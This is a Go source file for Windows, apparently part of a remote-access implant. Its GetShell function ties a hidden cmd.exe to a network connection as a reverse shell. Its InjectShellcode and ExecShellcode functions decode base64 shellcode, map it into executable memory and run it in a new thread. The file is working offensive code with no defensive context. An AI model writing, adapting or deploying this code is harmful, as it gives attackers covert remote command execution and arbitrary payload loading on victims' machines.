// +build windows !linux !darwin !freebsd

package remoteop

import (
	"encoding/base64"
	"io"
	"log"
	"net"
	"os/exec"
	"golang.org/x/sys/windows"
	"unsafe"
)

const (
	MEM_COMMIT  = 0x1000
	MEM_RESERVE = 0x2000
)

// GetShell pops an *exec.Cmd and return it to be used in a reverse shell
func GetShell(conn net.Conn) {
	//cmd := exec.Command("C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe")
	cmd := exec.Command("C:\\Windows\\System32\\cmd.exe")
	cmd.SysProcAttr = &windows.SysProcAttr{HideWindow: true}
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Stdout = conn
	_ = cmd.Run()

	copydata := func(r io.Reader, w io.Writer) {
		_, err := io.Copy(w, r)
		if err != nil {
			log.Println(err)
		}
	}

	go copydata(cmd.Stdin, conn)
	go copydata(conn, cmd.Stdout)
	go copydata(conn, cmd.Stderr)
}

// InjectShellcode decodes a base64 encoded shellcode and calls ExecShellcode on the decode value.
func InjectShellcode(encShellcode string) {
	if encShellcode != "" {
		if shellcode, err := base64.StdEncoding.DecodeString(encShellcode); err == nil {
			go ExecShellcode(shellcode)
		}
	}
}

// ExecShellcode maps a memory page as RWX, copies the provided shellcode to it
// and executes it via a syscall.Syscall call.
func ExecShellcode(shellcode []byte) {
	// Resolve kernell32.dll, and VirtualAlloc
	kernel32 := windows.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	// Reserve space to drop shellcode
	address, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_RESERVE|MEM_COMMIT, windows.PAGE_EXECUTE_READWRITE)
	// Ugly, but works
	addrPtr := (*[990000]byte)(unsafe.Pointer(address))
	// Copy shellcode
	for i, value := range shellcode {
		addrPtr[i] = value
	}
	procCreateThread.Call(0, 0, address, 0, 0, 0)
}